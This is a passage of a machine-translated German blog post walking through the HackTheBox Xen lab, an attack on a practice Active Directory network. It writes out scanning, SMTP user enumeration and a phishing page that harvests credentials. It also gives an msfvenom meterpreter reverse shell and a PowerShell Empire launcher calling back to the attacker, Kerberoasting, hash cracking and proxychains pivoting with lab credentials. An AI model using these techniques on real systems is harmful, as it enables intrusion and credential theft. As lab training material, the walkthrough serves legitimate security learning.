<!doctype html>
<html class="no-js" lang="de">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🧑🏼‍🤝‍🧑🏼 👵 👊🏼 HackTheBox-Endspiel. Exemplarische Vorgehensweise Xen Lab. Pentest Active Directory ⛹🏽 🎭 🌊</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In diesem Artikel analysieren wir nicht nur den Durchgang eines Autos, sondern eines ganzen Minilabors von der HackTheBox- Site . 
 
 Wie in der Besch...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>HackTheBox-Endspiel. Exemplarische Vorgehensweise Xen Lab. Pentest Active Directory</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/506980/"><img src="https://habrastorage.org/webt/-g/rq/3z/-grq3z8cvxjlhbkdm-hjxkdwcqc.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In diesem Artikel analysieren wir nicht nur den Durchgang eines Autos, sondern eines ganzen </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Minilabors</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> von der </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">HackTheBox-</font></a><font style="vertical-align: inherit;"> Site </font><font style="vertical-align: inherit;">. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wie in der Beschreibung angegeben, wurde Xen entwickelt, um Fähigkeiten in allen Phasen von Angriffen in einer kleinen Active Directory-Umgebung zu testen. </font><font style="vertical-align: inherit;">Ziel ist es, einen zugänglichen Host zu gefährden, die Berechtigungen zu erhöhen und letztendlich die gesamte Domäne zu gefährden, während 6 Flags gesammelt werden. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Hier finden Sie </font><font style="vertical-align: inherit;">eine Diskussion eines anderen Labor offensiven Operationen Professionelle </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hier</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Die Verbindung zum Labor erfolgt über VPN. </font><font style="vertical-align: inherit;">Es wird empfohlen, keine Verbindung von einem Arbeitscomputer oder von einem Host aus herzustellen, auf dem die für Sie wichtigen Daten verfügbar sind, da Sie in ein privates Netzwerk mit Personen gelangen, die etwas auf dem Gebiet der Informationssicherheit wissen :)</font></font><br>
<br>
<div class="spoiler" role="button" tabindex="0">
                        <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Organisationsinformationen</font></font></b>
                        <div class="spoiler_text">      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow">    </a>.<br>
<a name="habracut"></a><br>
      .          ,  -      ,      .<br>
</div>
                    </div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Intro</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dieses Endspiel besteht aus 6 Maschinen und enthält 6 Flags. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/qi/7m/jd/qi7mjdxucpxhje-cia76n_y_uio.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Die Beschreibung und Adresse des verfügbaren Hosts wird ebenfalls angegeben. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ks/h6/wl/ksh6wls_-pv2e2rmk0xbg_cc-x4.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lass uns anfangen!</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Flagge brechen</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dieser Computer hat eine IP-Adresse von 10.13.38.12, die ich zu / etc / hosts hinzufüge. </font></font><br>
<code>10.13.38.12 xen.htb</code><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zuerst scannen wir offene Ports. </font><font style="vertical-align: inherit;">Da das Scannen aller Ports mit nmap sehr lange dauert, werde ich dies zunächst mit masscan tun. </font><font style="vertical-align: inherit;">Wir scannen alle TCP- und UDP-Ports von der tun0-Schnittstelle mit einer Geschwindigkeit von 500 Paketen pro Sekunde.</font></font><br>
<br>
<pre><code class="bash hljs">sudo masscan -e tun0 -p1-65535,U:1-65535 10.13.38.12 --rate=500</code></pre><br>
<img src="https://habrastorage.org/webt/38/-e/xn/38-exn8blvfxcaqrpue5ekc_hwk.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Für detailliertere Informationen zu den Diensten, die an Ports ausgeführt werden, führen wir nun einen Scan mit der Option -A durch.</font></font><br>
<br>
<pre><code class="bash hljs">nmap -A xen.htb -p25,80,443</code></pre><br>
<img src="https://habrastorage.org/webt/28/b1/pr/28b1pr7-okzchmg-ci1ggbaxpow.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wir haben also IIS und SMTP. Gleichzeitig besteht die Möglichkeit, sowohl HTTP- als auch HTTPS-Verbindungen an den Ports 80 und 443 herzustellen. Schauen wir uns das Web an - wir werden von einer einfachen Seite begrüßt. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/up/in/cc/upinccvylfqvhode8at6xivs-ny.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Es gibt nichts Interessantes außer dem Link „Join the Team“, der uns die E-Mail-Adresse jointheteam@humongousretail.com angibt. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/1l/n2/k_/1ln2k_xo-b0vaxpdi1dhl2g2tqa.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lassen Sie uns die Verzeichnisse durchgehen. Ich benutze dafür Gobuster. In den Parametern geben wir die Anzahl der Streams 128 (-t), URL (-u), Wörterbuch (-w) und Erweiterungen an, die uns interessieren (-x).</font></font><br>
<br>
<pre><code class="bash hljs">gobuster dir -t 128 -u http://xen.htb/  -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,aspx</code></pre><br>
<img src="https://habrastorage.org/webt/0w/rp/et/0wrpetqsiwo1s2ylorprhhgugce.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und wir finden einige interessante Verzeichnisse. Der 401-Code zeigt das Vorhandensein einer HTTP-Authentifizierung an. Schauen wir uns Remote an. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/xo/du/8e/xodu8eovut5bbieahdwnatbyqqg.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wir akzeptieren und benötigen Anmeldeinformationen. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/5v/e0/1w/5ve01wb7xkwxjghn9laebsvcsxm.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wir brauchen Anmeldeinformationen. Aus diesem Grund habe ich mich entschlossen, zum SMTP-Server zurückzukehren und die Benutzernamen zu sortieren (ich empfehle, den von Metasploit angebotenen Namen als Namensliste zu verwenden). Wir machen das mit smtp-user-enum.</font></font><br>
<br>
<pre><code class="bash hljs">smtp-user-enum -M RCPT -U ./namelist.txt -D humongousretail.com -t xen.htb</code></pre><br>
<img src="https://habrastorage.org/webt/6x/vm/nf/6xvmnfxy7zrbwymwuy53mtsjub4.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wir finden 4 E-Mail-Adressen. Da wir IT-Service-Mail sehen, können wir in ihrem Namen eine Nachricht an alle anderen Benutzer senden. Kopieren wir die Remote-Autorisierungsseite, erstellen Sie eine gefälschte und senden Sie allen Benutzern die gefälschte Remote-Portal-Adresse (tatsächlich war ich sehr überrascht, als sich herausstellte, dass dies der richtige Vektor ist). </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sie können eine vollständige Kopie der Seite mit der SingleFile-Erweiterung für Firefox erstellen. Schauen Sie sich als Nächstes den Quellcode an und ändern Sie die Formulardaten. Die erste besteht darin, die Adresse zu ändern, an die die Anmeldeinformationen gesendet werden. Ich setze meinen Host und Port 81. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ki/_g/d3/ki_gd3wwmdo9rn2ywyixxrzlpdw.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und fügen Sie Senden hinzu, um die Daten zu senden. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ad/zf/bx/adzfbxlqlhef4csitqunfnqmxks.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Führen Sie nun netcat aus, um Port 81 abzuhören, aktivieren Sie den Webserver und verweisen Sie auf die geänderte Datei als index.html.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/jt/td/om/jttdomb7-i7rlqdhj4uasj9a8le.png" alt="Bild"><br>
<br>
<img src="https://habrastorage.org/webt/uf/-7/ud/uf-7ud36kzhbi3qvwd9yjlap2sw.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Es klappt! </font><font style="vertical-align: inherit;">Senden wir eine Nachricht zum Ändern der Portaladresse. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/nf/kf/q6/nfkfq6zng1tkm8owwsztsoyisfq.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Aber der Vektor ist korrekt, aber die Ausführung ist nicht sehr) Also bekommen wir die Daten, aber in einer Roboterform auf Port 80. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/de/xw/dp/dexwdpkgpo_oqb4ca2vczmwwqzi.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Somit sammeln wir alle Konten. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/as/ow/xd/asowxdq9r7mltqwhny2jatoh8ky.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und jetzt gehen wir zur Fernbedienung. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/mv/oq/v2/mvoqv2pe00qndtibx9aeprwh-uq.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und wir schlagen vor, die ICA-Datei zu speichern. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/yd/ke/a3/ydkea3fwsacwjzdcfe6qptwo1ra.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Als nächstes habe ich die Erweiterung für Chromium installiert. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/uf/nc/b4/ufncb4a2m0qdb2czjakbke5i9v4.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und als pmorgan (VDESKTOP3) verbunden. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/o8/ke/gx/o8kegx9kxnfiyskutyymimonhwo.png" alt="Bild"><br>
<br>
<img src="https://habrastorage.org/webt/a4/gb/1o/a4gb1of_eannxkf2gdhb-ra4cg8.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wir machen das gleiche mit anderen Benutzern. </font><font style="vertical-align: inherit;">Und Awardel finden die erste Flagge. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/1z/vs/ig/1zvsigpck-o1os7hmzs70jecape.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und mieten Sie es. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/yw/ii/9n/ywii9nxpta3h-scvghrdis9gpow.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und speichern Sie die gesammelten Informationen.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/as/ow/xd/asowxdq9r7mltqwhny2jatoh8ky.png"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Flag bereitstellen</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Möglicherweise stellen Sie fest, dass Betriebssysteme nicht die neuesten sind, daher müssen Exploits vorhanden sein. </font><font style="vertical-align: inherit;">Lassen Sie uns die Meterpreter-Shell werfen. </font><font style="vertical-align: inherit;">Erstellen Sie zunächst eine Last.</font></font><br>
<br>
<pre><code class="bash hljs">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.14.14.9 LPORT=3434 -f exe &gt; s.exe</code></pre><br>
<img src="https://habrastorage.org/webt/l6/cw/fp/l6cwfpozbfayv9egysl_lshdw-o.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Führen Sie nun den Metasploit-Listener aus.</font></font><br>
<br>
<pre><code class="bash hljs">handler -H 10.14.14.9 -P 3434 -p windows/x64/meterpreter/reverse_tcp</code></pre><br>
<img src="https://habrastorage.org/webt/af/rg/xh/afrgxhmdhrqsctrusvic-hftrqy.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wir gehen durch den Browser auf dem Zielcomputer, laden den Ladevorgang herunter und führen ihn aus. </font><font style="vertical-align: inherit;">Beachten Sie im Metasploit-Fenster die Verbindung in der ersten Sitzung. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/gk/95/hl/gk95hlyj70r7tqijdrcc3cdpi9g.png" alt="Bild"><br>
<br>
<img src="https://habrastorage.org/webt/hp/cs/g-/hpcsg-39centm7wanbtccngaqa0.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jetzt listen wir alle Exploits für LPE auf. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ai/_l/nj/ai_lnjg4to9h_7u5uf4yl706fjw.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und es gibt einige. </font><font style="vertical-align: inherit;">Verwenden wir den ersten, mit dem Sie den Systemkontext abrufen können. </font><font style="vertical-align: inherit;">Starten Sie einen neuen Listener. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/7t/bt/qe/7tbtqeoikcykli7ck9tategndxk.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und nutzen Sie den Exploit. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/3x/oz/pa/3xozpavk13cms-vl_yhxwy7a0rk.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Die zweite Sitzung wird im Kontext von SYSTEM geöffnet. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/cg/qi/uh/cgqiuh4chvqmax4smhxkopyae34.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lassen Sie uns die Flagge überprüfen. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/lq/rn/4m/lqrn4m6ruh6a29ufxfmffi8xjvw.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und nimm es. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/2m/_g/ct/2m_gctbxaccolc792cmxvfb5bgi.png"><br>
<br>
<img src="https://habrastorage.org/webt/ty/fy/yv/tyfyyv-vw0yeo5eid8_gy4fwr4i.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
So einfach, eine andere Flagge zu passieren. </font><font style="vertical-align: inherit;">Wir gehen weiter.</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Geisterflagge</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Für weitere Erkundungen ist es bequem, PowerShell zu verwenden, und noch bequemer, PowerShell Empire (über das ich </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hier geschrieben habe</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) </font><font style="vertical-align: inherit;">zu bearbeiten </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">Öffnen wir die Sitzung, erstellen Sie zunächst einen http- und PS-Launcher dafür.</font></font><br>
<br>
<pre><code class="bash hljs">&gt; listeners<font></font>
&gt; uselistener http<font></font>
&gt; <span class="hljs-built_in">set</span> Host 10.14.14.9<font></font>
&gt; <span class="hljs-built_in">set</span> Port 5656<font></font>
&gt; execute<font></font>
&gt; back<font></font>
&gt; launcher powershell http</code></pre><br>
<img src="https://habrastorage.org/webt/nw/h8/k_/nwh8k_g7pvp4d25k6mcm_g5ase0.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Speichern Sie den Launcher in der Datei s.ps1. </font><font style="vertical-align: inherit;">Um es über Meterpreter aus dem Speicher auszuführen, müssen Sie das Powershell-Modul laden. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/xe/hf/0m/xehf0mmdd6b0-hmnfbbqivm45p0.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und führen Sie Powershell_import aus. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/-f/nw/vv/-fnwvvmgxgd2stpsoceiizkfxhu.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Im Empire-Fenster finden wir den erstellten Agenten. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/f2/cm/7m/f2cm7mexe3pdgwtdgc_mghacli0.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Benennen Sie es für bequemes Arbeiten mit dem Namen der Workstation um und wechseln Sie in den interaktiven Modus. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ne/vj/oh/nevjoh8xwwovniicwob5gp6k-6u.png"><br>
<br>
<img src="https://habrastorage.org/webt/hj/uc/n3/hjucn3yy2uihhkibe99yoamwpfi.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Für die Intelligenz müssen wir einen Domänencontroller definieren. </font><font style="vertical-align: inherit;">Wir werden dies mit Hilfe eines wunderbaren Moduls get_domain_controller aus dem Abschnitt situational_awareness tun.</font></font><br>
<br>
<pre><code class="bash hljs">&gt; usemodule situational_awareness/network/powerview/get_domain_controller<font></font>
&gt; run<font></font>
</code></pre><br>
<img src="https://habrastorage.org/webt/pf/xe/61/pfxe61ftwboyhaqczuzu16huiho.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
So erhalten wir Informationen über den Domänencontroller. </font><font style="vertical-align: inherit;">Lassen Sie uns nun die Domain-Benutzer auflisten. </font><font style="vertical-align: inherit;">Zu diesem Zeitpunkt muss ich die Kontonamen und den Wert der AdminCount-Eigenschaft abrufen, um privilegierte Benutzer sofort zu identifizieren.</font></font><br>
<br>
<pre><code class="bash hljs">&gt; usemodule situational_awareness/network/powerview/get_user<font></font>
&gt; <span class="hljs-built_in">set</span> Server DC.htb.local<font></font>
&gt; <span class="hljs-built_in">set</span> Properties samaccountname,admincount<font></font>
&gt; run</code></pre><br>
<img src="https://habrastorage.org/webt/ep/bm/8n/epbm8n-0pxbqjkx8ugmru5mx84q.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Überprüfen wir sofort die SPNs, um festzustellen, ob Kerberoasting möglich ist.</font></font><br>
<br>
<pre><code class="bash hljs">&gt; usemodule situational_awareness/network/powerview/get_user<font></font>
&gt; <span class="hljs-built_in">set</span> Server DC.htb.local<font></font>
&gt; <span class="hljs-built_in">set</span> Properties serviceprincipalname<font></font>
&gt; run</code></pre><br>
<img src="https://habrastorage.org/webt/24/tu/qt/24tuqtogjlqw_wyj_wtkmirvjjq.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und da ist SPN! </font><font style="vertical-align: inherit;">Lassen Sie uns Kerberoasting mit demselben Imperium durchführen. </font><font style="vertical-align: inherit;">Geben Sie das Ausgabeformat an - Hashcat.</font></font><br>
<br>
<pre><code class="bash hljs">&gt; usemodule credentials/invoke_kerberoast<font></font>
&gt; <span class="hljs-built_in">set</span> OutputFormat Hashcat<font></font>
&gt; run</code></pre><br>
<img src="https://habrastorage.org/webt/fc/rt/n3/fcrtn3wmff8er48hsi4ck4epipe.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und wir bekommen den User-Hash. </font><font style="vertical-align: inherit;">Durchlaufen Sie nun Hashcat.</font></font><br>
<br>
<pre><code class="bash hljs">hashcat -m 13100 -a 0 krb.hash rockyou.txt --force</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dieses Passwort wurde nicht im rockyou-Wörterbuch gefunden, daher habe ich alle Wörterbücher aus Seclists überprüft. </font><font style="vertical-align: inherit;">Diese Option ist jedoch ebenfalls fehlgeschlagen. </font><font style="vertical-align: inherit;">Die letzte Option ist die Verwendung von </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NSA-Regeln</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br>
<br>
<img src="https://habrastorage.org/webt/jx/zh/kx/jxzhkxufm6pnpkkqjbqpe-fmj-k.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wie im Repository dargestellt, ist Tauchen die beste Option, daher verwenden wir die zweite Version.</font></font><br>
<br>
<pre><code class="bash hljs">hashcat -m 13100 krb.hash rockyou.txt -r nsa-rules/_NSAKEY.v2.dive.rule -debug-mode=1 -debug-file=rule.txt -d 2</code></pre><br>
<img src="https://habrastorage.org/webt/8t/m8/yy/8tm8yyoriogouhedrvjvixunnc4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und wir bekommen das Passwort für diesen Benutzer. </font><font style="vertical-align: inherit;">Scannen wir zur weiteren Verbesserung das lokale Netzwerk. </font><font style="vertical-align: inherit;">Dies geschieht am besten mit ARP-Scannen, da ICMP möglicherweise blockiert ist. </font><font style="vertical-align: inherit;">Das Arpscan-Modul hilft uns dabei. Wir kennen die Adresse und die Maske des Netzwerks und legen daher den Bereich der Hosts fest.</font></font><br>
<br>
<pre><code class="bash hljs">&gt; usemodule situational_awareness/network/arpscan<font></font>
&gt; <span class="hljs-built_in">set</span> Range 172.16.249.0-172.16.249.255<font></font>
&gt; run</code></pre><br>
<img src="https://habrastorage.org/webt/7f/vh/qd/7fvhqd_c2vdhwqryakt7yi7kaxu.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Also ... Aus dieser Liste kennen wir keine zwei Hosts: 201 und 202. Überprüfen wir die gemeinsam genutzten Ressourcen in der Domäne. </font><font style="vertical-align: inherit;">Von den Parametern benötigen wir nur die Adresse des Domänencontrollers.</font></font><br>
<br>
<pre><code class="bash hljs">&gt; usemodule situational_awareness/network/powerview/share_finder<font></font>
&gt; <span class="hljs-built_in">set</span> Server DC.htb.local<font></font>
&gt; run</code></pre><br>
<img src="https://habrastorage.org/webt/rs/p3/6d/rsp36dpdijzbbrioueihsptddj0.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mit jedem Scan erweitert sich unser Verständnis des Netzwerks. Lassen Sie uns herausfinden, welche Art von Host CITRIX.htb.local ist. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/cu/rk/m0/curkm01lzbyve769e7kdt7jjao4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nachfolgend finden Sie die Informationen, die wir sammeln. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/sd/zd/8z/sdzd8z_kll5ijcesm_asfi6xqse.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Um mit Ressourcen im internen Netzwerk zu interagieren, müssen wir den Tunnel konfigurieren. </font><font style="vertical-align: inherit;">Wir werden dies in der aktiven Meterpreter-Sitzung mit dem Befehl autoroute tun und die interne Netzwerkadresse und -maske als Parameter angeben (mit dem Parameter -p können wir aktive Routen überprüfen).</font></font><br>
<br>
<pre><code class="bash hljs">run autoroute -s 172.16.249.0/24 </code></pre><br>
<img src="https://habrastorage.org/webt/tn/tu/9y/tntu9y40tdn28avzmqtgl3o0ffw.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nachdem wir die Route zum Zielnetzwerk hinzugefügt haben, verwenden wir das Tool socks4a innerhalb der Plattform. </font><font style="vertical-align: inherit;">Das Hilfsmodul auxiliary / server / socks4a bietet einen Proxyserver, der die von uns erstellte Metasploit-Routing-Infrastruktur zum Weiterleiten von Verbindungen verwendet. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/-v/_j/0b/-v_j0bfvhwes3e1slvn42fwceqi.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und als Client-Redirector verwenden wir Proxy-Ketten. </font><font style="vertical-align: inherit;">Ändern Sie die Konfiguration /etc/proxychains.conf und geben Sie den von metasploit festgelegten Port an (Standardport ist 1080). </font></font><br>
<br>
<img src="https://habrastorage.org/webt/cy/_5/oh/cy_5ohot9iirrdzik2qssk8hj4a.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Für den gefundenen Benutzer ist das Citrix $ -Verzeichnis lesbar. </font><font style="vertical-align: inherit;">Da Proxy-Ketten Verbindungsinformationen anzeigen, entfernen wir diese mithilfe der Umleitung 2&gt; / dev / null.</font></font><br>
<br>
<pre><code class="bash hljs">proxychains cme smb -u mturner -p <span class="hljs-string">'4install!'</span> -d htb.local 172.16.249.201 --share <span class="hljs-string">"Citrix$"</span> --shares 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/qv/nr/ol/qvnroleugjrgp-i5izk_ovbpdps.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lassen Sie uns alles sehen, was uns auf dieser Ressource zur Verfügung steht.</font></font><br>
<br>
<pre><code class="bash hljs">proxychains smbmap -u mturner -p <span class="hljs-string">'4install!'</span> -d htb.local -H 172.16.249.201 -R 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/mj/g3/-n/mjg3-n6art569eklzc6dsoqx_fy.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und wir finden die Flagge sowie die ppk-Datei. </font><font style="vertical-align: inherit;">Lassen Sie uns alle Dateien bekommen.</font></font><br>
<br>
<pre><code class="bash hljs">sudo proxychains smbclient //172.16.249.201/Citrix$ -U htb.local\\mturner%4install!</code></pre><br>
<img src="https://habrastorage.org/webt/bi/s2/hw/bis2hwyvpobzvdkqykpbac_wfz0.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
